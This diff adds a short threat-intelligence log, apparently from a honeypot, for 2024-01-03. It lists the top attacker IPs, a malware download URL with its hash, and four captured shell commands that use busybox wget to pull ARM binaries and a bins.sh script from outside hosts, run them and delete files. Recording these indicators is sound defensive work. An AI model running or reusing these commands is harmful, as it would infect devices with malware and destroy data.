@@ -1,0 +1,20 @@
+Top 5 IPs for 2024-01-03:
+
+91.92.244.94
+219.76.178.108
+124.180.37.217
+45.79.145.181
+122.116.226.201
+
+
+Malware download: 
+Downloaded from : http://193.233.203.76/bins.sh
+5887ada70829ef154dcfa7cbee4ee555be39fa1a0109de4d04f286d5276d73c2
+https://www.virustotal.com/gui/file/5887ada70829ef154dcfa7cbee4ee555be39fa1a0109de4d04f286d5276d73c2
+
+Malicious commands seen:
+
+cd /data/local/tmp/; busybox wget http://45.157.11.10/rus.arm7; chmod 777 rus.arm7; ./rus.arm7 ADB; rm -rf *
+cd /data/local/tmp/; busybox wget http://2.58.113.242/popbang.arm7; chmod 777 popbang.arm7; ./popbang.arm7 taco; rm -rf *
+cd /data/local/tmp/; rm *; busybox wget http://45.157.11.10/rus.arm7; chmod 777 rus.arm7; ./rus.arm7 ADB
+cd /data/local/tmp; busybox wget http://5.181.80.102/armv7l; chmod 777 armv7l; ./armv7l; rm -rf armv7l; busybox wget http://5.181.80.102/bins.sh; sh bins.sh; rm -rf bins.sh
